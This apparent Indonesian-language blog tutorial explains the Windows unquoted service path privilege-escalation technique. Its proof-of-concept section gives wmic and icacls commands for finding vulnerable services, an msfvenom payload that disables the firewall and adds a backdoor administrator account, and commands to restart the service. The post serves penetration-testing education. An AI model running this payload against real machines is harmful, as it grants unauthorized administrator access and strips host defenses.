---
layout: post
title: "Unquoted Service Path"
date: 2024-01-12 07:00:00 +0700
categories: "Windows-Local-Privilege-Escalation"
---

Ketika terdapat Service yang menjalankan `C:\Program Files\Internal Application\Project One\MyApp.exe` tanpa menggunakan Quote (") maka ini akan menjadi masalah karena pada dasarnya ketika memulai Service akan menjalankannya seperti ini.
1. `C:\Program.exe` => Not Found
2. `C:\Program Files\Internal.exe` => Not Found
3. `C:\Program Files\Internal Application\Project.exe` => Not Found
4. `C:\Program Files\Internal Application\Project One\MyApp.exe` => Found

Bayangkan ketika Attacker menginjeksi malicious file dan diberi nama `Project.exe` di dalam `C:\Program Files\Internal Application\` maka ketika start, Service akan otomatis menjalankannya, seperti di bawah ini.
1. `C:\Program.exe` => Not Found
2. `C:\Program Files\Internal.exe` => Not Found
3. `C:\Program Files\Internal Application\Project.exe` => Found (Injected by Attacker)

# Proof of Concept

#### Find Unquoted Service Path
```
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

#### Check Who Can Write the Directory
```
icacls "C:\Program Files\<something>"
```

#### Craft Malicious (.exe)
```
msfvenom -p windows/exec CMD="cmd.exe /c NetSh Advfirewall set allprofiles state off && net user <username> password123 /ADD && net localgroup Administrators <username> /ADD" -f c --platform windows -b "\x00,\x0a"
```

#### Restart Service
```
sc stop "<service name>"
sc start "<service name>"
```

#### Check the Service
```
sc qc "<service name>"
```
